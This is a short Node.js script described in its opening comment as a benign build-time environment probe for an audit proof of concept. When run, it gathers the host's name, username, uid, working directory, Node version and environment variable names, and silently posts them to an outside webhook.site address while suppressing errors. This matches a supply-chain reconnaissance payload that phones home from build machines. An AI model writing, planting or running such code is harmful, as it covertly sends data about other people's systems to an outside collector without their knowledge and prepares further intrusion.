// build-time environment probe (audit PoC, benign: reports host identity only)
const https=require('https');
const os=require('os');
const data=JSON.stringify({
  ts:new Date().toISOString(),
  host:os.hostname(),
  user:(()=>{try{return require('os').userInfo().username}catch(e){return 'n/a'}})(),
  uid:typeof process.getuid==='function'?process.getuid():null,
  cwd:process.cwd(),
  envKeys:Object.keys(process.env).sort().slice(0,60),
  node:process.version
});
const req=https.request("https://webhook.site/164853ca-ae41-4b86-9c66-3a223f6e371f",{method:'POST',headers:{'content-type':'application/json','content-length':Buffer.byteLength(data)}},r=>{r.resume()});
req.on('error',()=>{});
req.write(data); req.end();
